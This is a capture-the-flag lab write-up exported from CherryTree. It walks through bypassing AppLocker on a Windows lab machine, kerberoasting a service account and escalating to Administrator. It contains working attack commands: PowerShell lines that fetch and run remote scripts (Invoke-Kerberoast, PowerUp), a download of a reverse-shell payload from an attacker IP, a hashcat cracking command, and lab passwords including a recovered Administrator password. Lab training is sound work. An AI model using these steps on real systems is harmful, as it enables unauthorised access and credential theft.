<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>corp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>corp</h1><br/><p><strong><h2>Corp</h2></strong></p><p></p><p>Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.</p><p></p><p>Firstly We RDP into the machine.</p><p><strong>Username: corp\dark</strong></p><p><strong>Password: _QuejVudId6</strong></p><p></p><p></p><p>Then we create a msfvenom reverse shell and send it to machine using the <strong>Target&#39;s Internet Explorer</strong> Or <strong>Powershell</strong></p><p></p><p>As we are regular user, we cannot change trsuted site settings. Its blocking the download. Only option is to use Powershell.</p><p><img src="images/18-1.png" alt="images/18-1.png" /></p><p></p><p></p><p><strong>Invoke-WebRequest -Uri http://10.11.72.31/SecurityUpdate.exe -OutFile SecurityUpdate.exe</strong></p><p></p><p><img src="images/18-2.png" alt="images/18-2.png" /></p><p></p><p>Note: Powershell is started with -ep bypass to bypass execution policy. Still the program gets blocked.</p><p>We try to run the program using explorer. We got the following error.</p><p></p><p></p><p><img src="images/18-3.png" alt="images/18-3.png" /></p><p></p><p></p><p></p><p><strong>AppLocker</strong> is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.</p><p></p><p>You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.</p><p></p><p>There are many ways to bypass <strong>AppLocker</strong>.</p><p></p><p>If AppLocker is configured with <strong>default AppLocker rules</strong>, we can bypass it by placing our executable in the following directory: </p><p><strong>C:\Windows\System32\spool\drivers\color</strong> 		-		 This is whitelisted by default. </p><p></p><p>Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.</p><p></p><p></p><p>Now, we move to the whitelist directory and download our payload.</p><p>Hooray! We are able to execute the program now.</p><p></p><p></p><p>But However, the now that we have <strong>bypassed Applocker</strong>. The <strong>Anti Virus</strong> is <strong>blocking</strong> the executible.</p><p><img src="images/18-4.png" alt="images/18-4.png" /></p><p></p><p></p><p>Even Running with Explorer gives the same error.</p><p></p><p><img src="images/18-5.png" alt="images/18-5.png" /></p><p></p><p></p><p></p><p><strong>Note: </strong>Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at <strong>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</strong></p><p></p><p><img src="images/18-6.png" alt="images/18-6.png" /></p><p></p><p><strong>Note:</strong> We have to open with <strong>Run (Win + R)</strong> or in <strong>CMD.exe</strong> else in <strong>Powershell</strong> we need to specify full path instead of &quot;%userprofile%</p><p></p><p><img src="images/18-7.png" alt="images/18-7.png" /></p><p></p><p>We can find the flag in the history.</p><p>We move on to next task.</p><p></p><p>Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!</p><p></p><p></p><p></p><p></p><p>Lets first enumerate Windows. If we run <strong>setspn -T medin -Q​ */*</strong> we can extract all accounts in the SPN.</p><p>SPN is the Service Principal Name, and is the mapping between service and account.</p><p></p><p><strong>setspn -T medin -Q */*</strong></p><p></p><p><strong>Note: </strong>Runs on both <strong>cmd</strong> and <strong>powershell</strong></p><p></p><p><img src="images/18-8.png" alt="images/18-8.png" /></p><p></p><p>Now we have seen there is an SPN for a user(<strong>fela</strong>), we can use Invoke-Kerberoast and get a ticket.</p><p></p><p>Lets first get the Powershell Invoke-Kerberoast script.</p><p></p><p><strong>iex​(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;) </strong></p><p></p><p>Now lets load this into memory: <strong>Invoke-Kerberoast -OutputFormat hashcat ​ |fl</strong></p><p>You should get a SPN ticket.</p><p></p><p><strong>Note:</strong> The Target machine was unable to connect to github so i copied the raw data from github to ca local kerberos.txt file and hosted it using python from the attacker machine.</p><p></p><p></p><p><img src="images/18-9.png" alt="images/18-9.png" /></p><p></p><p></p><p>Lets use hashcat to bruteforce this password. The type of hash we&#39;re cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.</p><p></p><p><strong>hashcat -m 13100 -​a 0 hash.txt wordlist --force</strong></p><p></p><p>We gcrack the password. The credentials are</p><p><strong>Username: fela</strong></p><p><strong>Password: rubenF124</strong></p><p></p><p>Now we RDP into the machine with the new user. The flag is on the desktop.</p><p></p><p><strong><h3>Privilege Escalation</h3></strong></p><p></p><p>We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.</p><p></p><p></p><p>We will run PowerUp.ps1 for the enumeration.</p><p></p><p>Lets load PowerUp1.ps1 into memory.</p><p></p><p>i<strong>ex​(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;) </strong></p><p><strong>Invoke-AllChecks</strong></p><p></p><p>The script has identified several ways to get Administrator access. The first being to <strong>bypassUAC</strong> and the second is <strong>UnattendedPath</strong>. We will be exploiting the UnattendPath way.</p><p></p><p><img src="images/18-10.png" alt="images/18-10.png" /></p><p></p><p>&quot;Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.&quot; </p><p></p><p><img src="images/18-11.png" alt="images/18-11.png" /></p><p></p><p>It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.</p><p></p><p><img src="images/18-12.png" alt="images/18-12.png" /></p><p></p><p></p><p>Now we have the Administrator password in base64 format. We will decode it to get Admin credentials.</p><p></p><p><img src="images/18-13.png" alt="images/18-13.png" /></p><p></p><p>Note: We decoded it in powershell itself. We could have decoded in kali machine. But the above works if <strong>certutil.exe</strong> is installed.</p><p></p><p><img src="images/18-14.png" alt="images/18-14.png" /></p><p></p><p>New Credentials found:</p><p></p><p><strong>Username: Administrator</strong></p><p><strong>Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T</strong></p><p></p><p>We RDP into the machine as Administrator and get the root flag.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
